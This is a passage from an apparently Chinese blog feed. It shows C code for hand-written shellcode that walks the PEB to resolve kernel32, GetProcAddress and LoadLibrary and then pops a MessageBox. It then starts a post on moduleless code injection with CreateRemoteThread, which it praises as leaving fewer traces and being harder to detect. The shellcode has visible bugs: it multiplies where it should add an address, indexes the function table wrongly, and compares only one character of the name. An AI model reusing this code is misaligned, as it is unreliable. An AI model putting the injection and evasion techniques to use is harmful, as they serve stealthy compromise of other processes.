data-num=\"31\"></td><td><pre>\tUNICODE_STRING\tBaseDllName<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\tDWORD\t\t\tFlags<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\tWORD\t\t\tLoadCout<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\tWORD\t\t\tTlsIndex<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\tLIST_ENTRY\t\tHashLinks<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\tVOID<span class=\"token operator\">*</span>\t\t\tSectionPointer<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\tDWORD\t\t\tCheckSum<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\tDWORD\t\t\tTimeDateStamp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\tVOID<span class=\"token operator\">*</span>\t\t\tLoadedImports<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\tVOID<span class=\"token operator\">*</span>\t\t\tEntryPointActivationContext<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\tVOID<span class=\"token operator\">*</span>\t\t\tPathInformation<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token punctuation\">&#125;</span>LDR_DATA_TABLE_ENTRY<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token comment\">// 定义函数指针类型</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token function\">HMODULE</span><span class=\"token punctuation\">(</span>WINAPI<span class=\"token operator\">*</span> PLOADLIBRARY<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\tLPCTSTR lpFileName</pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token function\">DWORD</span><span class=\"token punctuation\">(</span>WINAPI<span class=\"token operator\">*</span> PGETPROCADDRESS<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\tHMODULE hModule<span class=\"token punctuation\">,</span> </pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\tLPCSTR lpProcName</pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span>WINAPI<span class=\"token operator\">*</span> PMESSAGEBOX<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\tHWND hWnd<span class=\"token punctuation\">,</span> </pre></td></tr><tr><td data-num=\"60\"></td><td><pre>\tLPCTSTR lpText<span class=\"token punctuation\">,</span> </pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\tLPCTSTR lpCaption<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\tUINT uType</pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">ShellCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\t<span class=\"token comment\">// 声明变量，赋值</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>\tLDR_DATA_TABLE_ENTRY<span class=\"token operator\">*</span> pPLD <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span> pBeg <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"73\"></td><td><pre>\tPLOADLIBRARY pLoadLibrary <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>\tPGETPROCADDRESS pGetProcAddress <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>\tPMESSAGEBOX pMessageBox <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"77\"></td><td><pre>\tWORD<span class=\"token operator\">*</span> pFirst <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span> pLast <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>\tDWORD ret <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>\tDWORD dwKernelBase <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"81\"></td><td><pre>\t<span class=\"token comment\">// 定义自己要使用的 DLL、函数</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>\tWCHAR szKernel32<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token string\">'K'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'E'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'R'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'N'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'E'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'L'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'3'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'.'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'d'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'l'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'l'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>\t<span class=\"token comment\">//4B 00 45 00 52 00 4E 00 45 00 4C 00 33 00 32 00 2E 00 44 00 4C 00 4C 00</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre></pre></td></tr><tr><td data-num=\"86\"></td><td><pre></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>\t<span class=\"token keyword\">char</span> szUser32<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token string\">'U'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'S'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'E'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'R'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'3'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'.'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'d'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'l'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'l'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>\t<span class=\"token keyword\">char</span> szGetProcAddr<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token string\">'G'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'e'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'t'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'P'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'o'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'c'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'A'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'d'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'d'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'e'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'s'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'s'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>\t<span class=\"token keyword\">char</span> szLoadLibrary<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token string\">'L'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'o'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'d'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'L'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'i'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'b'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'y'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'W'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>\t<span class=\"token keyword\">char</span> szMessageBox<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token string\">'M'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'e'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'s'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'s'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'g'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'e'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'B'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'o'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'x'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'W'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>\t<span class=\"token comment\">// 获取链表 TEB->PEB->_PEB_LDR_DATA->_LDR_DATA_TABLE_ENTRY</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>\t__asm <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>\t\tmov eax<span class=\"token punctuation\">,</span>fs<span class=\"token operator\">:</span><span class=\"token punctuation\">[</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">]</span>\t<span class=\"token comment\">//PEB</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>\t\tmov eax<span class=\"token punctuation\">,</span><span class=\"token punctuation\">[</span>eax<span class=\"token operator\">+</span><span class=\"token number\">0x0c</span><span class=\"token punctuation\">]</span>\t<span class=\"token comment\">//PEB->Ldr</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>\t\tadd eax<span class=\"token punctuation\">,</span><span class=\"token number\">0x0c</span>\t\t<span class=\"token comment\">//_PEB_LDR_DATA->InLoadOrderModuleList</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>\t\tmov pBeg<span class=\"token punctuation\">,</span>eax</pre></td></tr><tr><td data-num=\"99\"></td><td><pre>\t\tmov eax<span class=\"token punctuation\">,</span><span class=\"token punctuation\">[</span>eax<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>\t\tmov pPLD<span class=\"token punctuation\">,</span>eax</pre></td></tr><tr><td data-num=\"101\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>\t<span class=\"token comment\">// 遍历找到 Kernel32.dll</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>\t<span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>pPLD <span class=\"token operator\">!=</span> pBeg<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>\t\tpLast <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>WORD<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>pPLD<span class=\"token operator\">-></span>BaseDllName<span class=\"token punctuation\">.</span>Buffer<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>\t\tpFirst <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>WORD<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>szKernel32<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>pFirst <span class=\"token operator\">==</span> <span class=\"token operator\">*</span>pLast<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>\t\t\tdwKernelBase <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>DWORD<span class=\"token punctuation\">)</span>pPLD<span class=\"token operator\">-></span>DllBase<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>\t\tpPLD <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>LDR_DATA_TABLE_ENTRY<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>pPLD<span class=\"token operator\">-></span>InloadOrderModuleList<span class=\"token punctuation\">.</span>Flink<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>\t<span class=\"token comment\">// 遍历 Kernel32.dll 的导出表 找到 GetProcAddress</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>\tPIMAGE_DOS_HEADER pIDH <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>PIMAGE_DOS_HEADER<span class=\"token punctuation\">)</span>dwKernelBase<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>\tPIMAGE_NT_HEADERS pINHS <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>PIMAGE_NT_HEADERS<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD<span class=\"token punctuation\">)</span>dwKernelBase <span class=\"token operator\">+</span> pIDH<span class=\"token operator\">-></span>e_lfanew<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>\tPIMAGE_EXPORT_DIRECTORY pIED <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>PIMAGE_EXPORT_DIRECTORY<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD<span class=\"token punctuation\">)</span>dwKernelBase <span class=\"token operator\">+</span> pINHS<span class=\"token operator\">-></span>OptionalHeader<span class=\"token punctuation\">.</span>DataDirectory<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>VirtualAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"121\"></td><td><pre>\tDWORD<span class=\"token operator\">*</span> pAddOfFun_Raw <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>DWORD<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD<span class=\"token punctuation\">)</span>dwKernelBase <span class=\"token operator\">+</span> pIED<span class=\"token operator\">-></span>AddressOfFunctions<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>\tWORD<span class=\"token operator\">*</span> pAddOfOrd_Raw <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>WORD<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD<span class=\"token punctuation\">)</span>dwKernelBase <span class=\"token operator\">+</span> pIED<span class=\"token operator\">-></span>AddressOfNameOrdinals<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>\tDWORD<span class=\"token operator\">*</span> pAddOfNames_Raw <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>DWORD<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD<span class=\"token punctuation\">)</span>dwKernelBase <span class=\"token operator\">+</span> pIED<span class=\"token operator\">-></span>AddressOfNames<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"125\"></td><td><pre>\tDWORD dwCnt <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>\t<span class=\"token keyword\">char</span><span class=\"token operator\">*</span> pFinded <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span> pSrc <span class=\"token operator\">=</span> szGetProcAddr<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">;</span>dwCnt  <span class=\"token operator\">&lt;</span> pIED<span class=\"token operator\">-></span>NumberOfNames<span class=\"token punctuation\">;</span>dwCnt <span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>\t\tpFinded <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD<span class=\"token punctuation\">)</span>dwKernelBase <span class=\"token operator\">*</span> pAddOfNames_Raw<span class=\"token punctuation\">[</span>dwCnt<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>pFinded <span class=\"token operator\">==</span> <span class=\"token operator\">*</span>pSrc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>\t\t\tpGetProcAddress <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>PGETPROCADDRESS<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD<span class=\"token punctuation\">)</span>dwKernelBase <span class=\"token operator\">+</span> pAddOfFun_Raw<span class=\"token punctuation\">[</span>pAddOfFun_Raw<span class=\"token punctuation\">[</span>dwCnt<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>\t\tpSrc <span class=\"token operator\">=</span> szGetProcAddr<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>\t<span class=\"token comment\">// 有了 GetProcAddress 就可以得到任何 API 函数了</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>\tpLoadLibrary <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>PLOADLIBRARY<span class=\"token punctuation\">)</span><span class=\"token function\">pGetProcAddress</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>HMODULE<span class=\"token punctuation\">)</span>dwKernelBase<span class=\"token punctuation\">,</span> szLoadLibrary<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>\tpMessageBox <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>PMESSAGEBOX<span class=\"token punctuation\">)</span><span class=\"token function\">pGetProcAddress</span><span class=\"token punctuation\">(</span><span class=\"token function\">pLoadLibrary</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>LPCTSTR<span class=\"token punctuation\">)</span>szUser32<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> szMessageBox<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>\t<span class=\"token comment\">// 使用函数</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre>\t<span class=\"token keyword\">char</span> szTitle<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token string\">'S'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'h'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'e'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'l'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'l'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'C'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'o'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'d'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'e'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>\t<span class=\"token keyword\">char</span> szContent<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token string\">'S'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'h'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'e'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'l'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'l'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'C'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'o'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'d'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'e'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre>\t<span class=\"token function\">pMessageBox</span><span class=\"token punctuation\">(</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>LPCTSTR<span class=\"token punctuation\">)</span>szContent<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>LPCTSTR<span class=\"token punctuation\">)</span>szTitle<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre></pre></td></tr><tr><td data-num=\"149\"></td><td><pre></pre></td></tr><tr><td data-num=\"150\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre>\t<span class=\"token function\">ShellCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"152\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"153\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure>",
            "tags": [
                "Win32",
                "ShellCode原则"
            ]
        },
        {
            "id": "https://self-ferry.github.io/Win%E6%97%A0%E6%A8%A1%E5%9D%97%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/",
            "url": "https://self-ferry.github.io/Win%E6%97%A0%E6%A8%A1%E5%9D%97%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/",
            "title": "Win无模块注入代码",
            "date_published": "2021-07-20T12:52:47.000Z",
            "content_html": "<h1 id=\"代码注入\"><a class=\"anchor\" href=\"#代码注入\">#</a> 代码注入</h1>\n<p>把自己想要使用的函数复制到目标进程中。</p>\n<p><strong>复制代码的编写原则：</strong></p>\n<blockquote>\n<p>不能有全局变量<br />\n不能使用常量字符串<br />\n不能使用系统调用<br />\n不能嵌套调用其他函数</p>\n</blockquote>\n<p>这些都是可以解决的。</p>\n<p><strong>以创建一个文件举例</strong></p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<p>以上图举例</p>\n<p>我在代码进程中创建一个函数，这个函数实现的功能是创建一个文件。</p>\n<p>这个函数的格式一定要遵守线程函数的格式，既一个四个字节的参数一个返回值。<br />\n写完这个函数后就可以直接把这个函数复制到目标进程中去，把复制后函数的地址，赋给 <code>CreateRemoteThread</code> ，这样就解决了创建远程线程后线程函数的问题，并且这个线程函数是在我的代码进程中写的，这样就可以按照我自己的要求来写。</p>\n<p>可这个函数如果要创建一个文件的话，必须要用到 <code>CreateFile</code>  这个系统函数，可我们不能直接这样写，因为调用者个函数依赖的是进程本身的导入表，复制到目标进程后，目标进程的导入表跟当前进程的导入表是不一样的。</p>\n<p>因为远程线程函数能够接受参数，那我单独在分配一块内存，比如说我这块内存是一个结构体，我把所有用到的参数都赋好值，然后复制到目标进程，并且把结构体在目标进程中的地址传给远程线程参数，这样就解决了远程线程函数参数的问题，并且线程函数和参数都是我自己可控的。</p>\n<p>不会像 dll 注入留下明显的痕迹，唯一的痕迹就是几块内存空间了。从检测的角度来看，代码注入的检测要比 dll 注入的检测复杂的多。</p>\n<h2 id=\"代码实例\"><a class=\"anchor\" href=\"#代码实例\">#</a> 代码实例</h2>\n<p>主要是理解流程，掌握思路。</p>\n<p>需求：在目标进程中执行 <code>CreateFile</code>  